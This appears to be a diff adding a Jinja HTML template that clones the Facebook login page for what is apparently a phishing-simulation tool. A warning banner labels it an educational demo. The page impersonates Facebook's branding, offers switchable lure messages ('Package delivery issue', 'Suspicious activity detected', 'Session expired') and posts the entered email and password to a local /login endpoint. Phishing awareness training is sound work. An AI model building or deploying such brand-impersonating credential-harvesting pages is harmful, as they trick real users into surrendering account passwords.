@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - log in or sign up</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: SFProDisplay, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        /* Educational Warning */
+        .edu-warning {
+            background: #ffc107;
+            color: #000;
+            text-align: center;
+            padding: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            width: 100%;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 9999;
+            border-bottom: 2px solid #e0a800;
+        }
+
+        .container {
+            max-width: 980px;
+            width: 100%;
+            margin: 40px auto;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            padding-top: 40px;
+        }
+
+        .left-section {
+            flex: 1;
+            min-width: 300px;
+            padding-right: 32px;
+        }
+
+        .left-section h1 {
+            color: #1877f2;
+            font-size: 60px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .left-section p {
+            font-size: 28px;
+            font-weight: 400;
+            line-height: 32px;
+            color: #1c1e21;
+            max-width: 500px;
+        }
+
+        .right-section {
+            flex: 1;
+            min-width: 300px;
+            max-width: 400px;
+        }
+
+        .login-card {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+
+        .alert-message {
+            background-color: #ffebe8;
+            border: 1px solid #dd3c10;
+            border-radius: 5px;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #1c1e21;
+            display: flex;
+            align-items: center;
+        }
+
+        .alert-icon {
+            color: #dd3c10;
+            font-size: 20px;
+            margin-right: 10px;
+            font-weight: bold;
+        }
+
+        .delivery-banner {
+            background: #e7f3ff;
+            border-left: 4px solid #1877f2;
+        }
+
+        .bank-banner {
+            background: #ffebe8;
+            border-left: 4px solid #dd3c10;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            background: #ffffff;
+            outline: none;
+            transition: border-color 0.15s;
+        }
+
+        .form-group input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .login-btn:hover {
+            background: #166fe5;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin: 16px 0;
+        }
+
+        .forgot-password a {
+            color: #1877f2;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+
+        .create-account {
+            text-align: center;
+        }
+
+        .create-btn {
+            background: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px 16px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin: 10px 0;
+        }
+
+        .create-btn:hover {
+            background: #36a420;
+        }
+
+        .create-page {
+            text-align: center;
+            font-size: 14px;
+            color: #1c1e21;
+            margin-top: 28px;
+        }
+
+        .create-page a {
+            color: #1c1e21;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .create-page a:hover {
+            text-decoration: underline;
+        }
+
+        .error-message {
+            color: #dd3c10;
+            font-size: 13px;
+            margin-bottom: 10px;
+            text-align: center;
+            background: #ffebe8;
+            padding: 8px;
+            border-radius: 5px;
+        }
+
+        .language-bar {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 20px;
+            color: #8a8d91;
+            font-size: 12px;
+        }
+
+        .language-bar a {
+            color: #8a8d91;
+            text-decoration: none;
+        }
+
+        .language-bar a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            margin-top: 20px;
+            color: #737373;
+            font-size: 11px;
+            text-align: center;
+        }
+
+        @media (max-width: 900px) {
+            .container {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .left-section {
+                padding-right: 0;
+                margin-bottom: 30px;
+            }
+            
+            .left-section p {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="edu-warning">
+        ⚠️ EDUCATIONAL SECURITY DEMO - DO NOT ENTER REAL PASSWORDS ⚠️
+    </div>
+
+    <div class="container">
+        <div class="left-section">
+            <h1>facebook</h1>
+            <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+
+        <div class="right-section">
+            <div class="login-card">
+                <!-- Dynamic alert based on URL parameter -->
+                {% if attack_type == 'delivery' %}
+                <div class="alert-message delivery-banner">
+                    <span class="alert-icon">📦</span>
+                    <span><strong>Package delivery issue:</strong> Please verify your account to continue with your delivery.</span>
+                </div>
+                {% elif attack_type == 'bank' %}
+                <div class="alert-message bank-banner">
+                    <span class="alert-icon">⚠️</span>
+                    <span><strong>Suspicious activity detected:</strong> Verify your identity to secure your account.</span>
+                </div>
+                {% elif attack_type == 'verification' %}
+                <div class="alert-message">
+                    <span class="alert-icon">🔐</span>
+                    <span><strong>Session expired:</strong> Please login again to continue.</span>
+                </div>
+                {% endif %}
+
+                <!-- Login Form -->
+                <form action="/login?portal=facebook" method="POST" id="loginForm">
+                    <div class="form-group">
+                        <input type="text" id="username" name="username" 
+                               placeholder="Email or phone number" 
+                               value="{{ last_username if last_username else '' }}"
+                               required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <input type="password" id="password" name="password" 
+                               placeholder="Password" 
+                               required>
+                    </div>
+                    
+                    {% if error %}
+                    <div class="error-message">
+                        {{ error }}
+                    </div>
+                    {% endif %}
+                    
+                    <button type="submit" class="login-btn">Log In</button>
+                    
+                    <div class="forgot-password">
+                        <a href="#">Forgotten password?</a>
+                    </div>
+                    
+                    <div class="divider"></div>
+                    
+                    <div class="create-account">
+                        <button type="button" class="create-btn" onclick="alert('This is a demo. In real Facebook, this would create an account.')">
+                            Create new account
+                        </button>
+                    </div>
+                </form>
+            </div>
+            
+            <div class="create-page">
+                <a href="#">Create a Page</a> for a celebrity, brand or business.
+            </div>
+
+            <div class="language-bar">
+                <a href="#">English (UK)</a>
+                <a href="#">मराठी</a>
+                <a href="#">हिन्दी</a>
+                <a href="#">ಕನ್ನಡ</a>
+                <a href="#">Português (Brasil)</a>
+                <a href="#">Русский</a>
+                <a href="#">עברית</a>
+                <a href="#">+</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div style="margin-bottom: 10px;">
+            <a href="#" style="color: #737373; text-decoration: none; margin: 0 5px;">Sign Up</a> |
+            <a href="#" style="color: #737373; text-decoration: none; margin: 0 5px;">Log In</a> |
+            <a href="#" style="color: #737373; text-decoration: none; margin: 0 5px;">Messenger</a> |
+            <a href="#" style="color: #737373; text-decoration: none; margin: 0 5px;">Facebook Lite</a> |
+            <a href="#" style="color: #737373; text-decoration: none; margin: 0 5px;">Video</a> |
+            <a href="#" style="color: #737373; text-decoration: none; margin: 0 5px;">Places</a> |
+            <a href="#" style="color: #737373; text-decoration: none; margin: 0 5px;">Games</a> |
+            <a href="#" style="color: #737373; text-decoration: none; margin: 0 5px;">Marketplace</a> |
+            <a href="#" style="color: #737373; text-decoration: none; margin: 0 5px;">Meta Pay</a>
+        </div>
+        <div>
+            Meta © 2026
+        </div>
+    </div>
+</body>
+</html>
